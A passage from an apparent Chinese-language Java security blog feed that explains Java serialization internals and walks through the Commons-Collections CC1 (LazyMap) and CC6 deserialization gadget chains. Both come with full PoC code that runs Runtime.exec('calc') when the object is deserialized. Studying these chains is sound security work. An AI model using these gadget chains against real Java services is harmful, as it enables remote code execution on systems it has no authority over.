(extendedDebugInfo) &#123;</span><br><span class="line">                    debugInfoStack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            curPut = oldPut;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            defaultWriteFields(obj, slotDesc);<span class="comment">//③</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>① desc.getClassDataLayout 会返回 ObjectStreamClass.ClassDataSlot[] ，我们来看看 ClassDataSlot 类，可以看到它是封装了 ObjectStreamClass 而已，所以我们就简单的认为 ① 这一步就是用于返回序列化对象及其父类的 ClassDataSlot[] 数组，我们可以从 ClassDataSlot 中获取对应 ObjectStreamClass 描述信息。</p>
<p>② 开始遍历返回的数组，slotDesc 这个我们就简单将其看成对一个对象的描述吧。hasWriteObjectMethod 表示的是什么呢？这个其实就是你要序列化这个对象是否有 writeObject 这个 private 方法，注意哦，这个方法并不是任何接口的方法，而是我们手动写的，读者可以参考 ArrayList 代码，它内部就有这个方法。那么这个方法的作用是什么呢？这个方法我们在上面也演示过具体的使用，它就是用于自定义序列化过程的，读者可以返回到上面看看如果使用这个 writeObject 实现自定义序列化过程的。注意：其实这个过程不像实现 Externalizable 接口那样，自己完全去自定义序列化数据。</p>
<p><font style="color:rgb(77, 77, 77);">③ defaultWriteFields 这个方法就是 JVM 自动帮我们序列化了</font></p>
<p><strong><font style="color:rgb(77, 77, 77);">这个方法主要分为以下两步</font></strong></p>
<ul>
<li><font style="color:rgb(51, 51, 51);">① 写入基本数据类型的数据</font></li>
<li><font style="color:rgb(51, 51, 51);">②写入引用数据类型的数据，这里最终又调用到了 writeObject0() 方法，读者可以返回到上面去看看具体的实现。</font></li>
</ul>
<h2 id="ZwkKN"><font style="color:rgb(79, 79, 79);">readObject 原理分析</font></h2>
<font style="color:rgb(77, 77, 77);">从流中读取类的描述信息 ObjectStreamClass 实例，通过这个对象就可以创建出序列化的对象。</font>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> readClassDesc(<span class="literal">false</span>);</span><br><span class="line">...</span><br><span class="line">  Object obj;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  	<span class="comment">//创建对应反序列化的对象</span></span><br><span class="line">    obj = desc.isInstantiable() ? desc.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">    <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">        desc.forClass().getName(),</span><br><span class="line">        <span class="string">&quot;unable to create instance&quot;</span>).initCause(ex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(77, 77, 77);">读取该对象及其对象的父类的 ObjectStreamClass信息</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(77, 77, 77);">然后遍历得到每一个 ObjectStreamClass 对象，将对应的属性值赋值给需要反序列化的对象。</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defaultReadFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="literal">null</span> &amp;&amp; obj != <span class="literal">null</span> &amp;&amp; !cl.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassCastException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">primDataSize</span> <span class="operator">=</span> desc.getPrimDataSize();</span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="literal">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="keyword">new</span> <span class="title class_">byte</span>[primDataSize];</span><br><span class="line">    &#125;</span><br><span class="line">    bin.readFully(primVals, <span class="number">0</span>, primDataSize, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">        desc.setPrimFieldValues(obj, primVals);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">objHandle</span> <span class="operator">=</span> passHandle;</span><br><span class="line">    <span class="comment">//从 ObjectStreamClass 中得到对象的所有 Field 信息</span></span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="literal">false</span>);</span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> <span class="title class_">Object</span>[desc.getNumObjFields()];</span><br><span class="line">    <span class="type">int</span> <span class="variable">numPrimFields</span> <span class="operator">=</span> fields.length - objVals.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        <span class="type">ObjectStreamField</span> <span class="variable">f</span> <span class="operator">=</span> fields[numPrimFields + i];</span><br><span class="line">        objVals[i] = readObject0(f.isUnshared());</span><br><span class="line">        <span class="keyword">if</span> (f.getField() != <span class="literal">null</span>) &#123;</span><br><span class="line">            handles.markDependency(objHandle, passHandle);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">    		<span class="comment">//将数据保存到对象中去</span></span><br><span class="line">        desc.setObjFieldValues(obj, objVals);</span><br><span class="line">    &#125;</span><br><span class="line">    passHandle = objHandle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>CC1链补充</title>
    <url>/2025/02/23/CC1%E9%93%BE%E8%A1%A5%E5%85%85/</url>
    <content><![CDATA[<h1 id="sYR9S">CC1（ysoserial）</h1>
ysoserial中的cc1和我们前面所说后半部分是一样的，这里就不细说

<p>在ysoserial中的cc1是用LazyMap替换了<code>TransformedMap</code></p>
<p>现在使用<code>LazyMap</code>的<code>get</code>方法去触发<code>ChainedTransformer</code>的<code>transform</code>方法</p>
<h2 id="Qwtwt">CC1（ysoserial）攻击链分析</h2>
<h3 id="QXzfE">调用transform方法</h3>
下面为LazyMap的部分代码

<p>我们来看<code>LazyMap</code>的<code>get</code>方法</p>
<p>若map中存在这个key，就返回key，如果没有这个key，才会调用<code>factory</code>的<code>transform</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>LazyMap</code>与<code>TransformedMap</code>相类似，是一个protected属性的类，无法直接构造，因此我们需要去调用其<code>decorate</code>去构造一个<code>LazyMap</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="Ee9GJ">动态代理 调用get方法</h3>
调用get方法的地方很多，我们这里直接找到我们需要的`AnnotationInvocationHandler`中的`invoke`方法，其中`Object result = memberValues.get(member);`部分调用了 `get`方法，且member参数可控

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">            paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">            <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">            <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">            result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>构造好LazyMap后，想要通过<code>AnnotationInvocationHandler</code>触发<code>get</code>方法，我们需要构造一个动态代理，因为想要调用invoke方法，需要用动态代理去调用任意一个方法，从而调用<code>invoke</code>方法里面的<code>get</code>方法</p>
<blockquote>
<p>Proxy类继承了Serializable接口</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationhdlConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">annotationInvocationhdlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationhdlConstructor.newInstance(Override.class, mapProxy);</span><br></pre></td></tr></table></figure>

<p>构造好动态代理后，需要去调用其任意方法</p>
<p>下面是invoke方法部分代码</p>
<p>代码表达的意思是想要走到get方法，就不能调用其equals方法，且调用的是一个无参方法才行，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>有一个特别巧妙地地方，在<code>AnnotationInvocationHandler</code>的<code>readObject</code>中，会有一个调用memberValues的<code>entrySet</code>方法，正好是一个不为equals的无参方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet())</span><br></pre></td></tr></table></figure>

<p>根据分析写出的整个poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationhdlConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationhdlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationhdlConstructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="VfTKc">版本修复</h2>
实际在jdk_8u71之后，`AnnotationInvocationHandler`类做了一些调整，直接去掉了`readObject`中的`checkSetValue`方法

<p>而对动态代理类的序列化也有一定的调整，但是实际非常麻烦，这里我们就不说了</p>
<p>因此这两条链都断了</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>CC6链</title>
    <url>/2025/02/24/CC6%E9%93%BE/</url>
    <content><![CDATA[<h1 id="GcpnO">CC6链</h1>
**tips：cc6这条链是不受jdk版本限制的**

<p>cc6的入口换成了<code>HashMap</code>的<code>readObject</code>方法，这条链实际是要调用<strong>LazyMap的get方法</strong>，后面的部分就和ysoserial中的cc1后半链一样了</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734695541337-3f67c49d-2811-4060-92e2-afaf8ccda159.png"></p>
<p>当时我们说URLDNS链中讲到了 <code>HashMap</code>的<code>readObject</code>方法，调用了<code>hashCode</code>方法，现在我们需要去找一个类，它的<code>hashCode</code>方法需要去调用<code>LazyMap</code>的<code>get</code>方法</p>
<h2 id="ZDM3m">CC6攻击链分析</h2>
<h3 id="DpHqE">调用LazyMap.get</h3>
这里就是`TiedMapEntry`类（以下是该类的部分代码）

<p>该类的<code>hashCode</code>方法调用了自身类的<code>getValue</code>方法，该方法中调用了map的<code>get</code>方法，该类的map和key参数都是可控的，map为<code>LazyMap</code>时，就会调用<code>LazyMap</code>的<code>get</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>剩下的部分都和cc1是相同的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map1, chainedTransformer);</span><br></pre></td></tr></table></figure>

<p>现在我们需要一个构造TiedMapEntry类，由于它是public属性的，我们直接new就可以了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//其中将lazyMap放入他的map位置，因为上面说了，调用的是map的get方法</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="number">1</span>)</span><br><span class="line"><span class="comment">//构造一个HashMap去存TiedMapEntry，调用key位置的hashcode方法</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map2.put(entry, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>下面我会给出链子相关的源码，来简单看一下这条链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HashMap.readObject部分源码</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">// HashMap.hash源码</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// TiedMapEntry.hashCode源码</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>构造的poc如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map1, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(entry, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(map2);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="B4BFR">最后调整</h2>
现在有一个问题就是，在put(entry,1)的时候，就已经触发了计算器

<p>是因为在HashMap的put方法时，就已经触发了它的hash方法（部分代码rux）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们现在回到URLDNS那个链的想法，先传入一个无用的东西，然后通过反射修改</p>
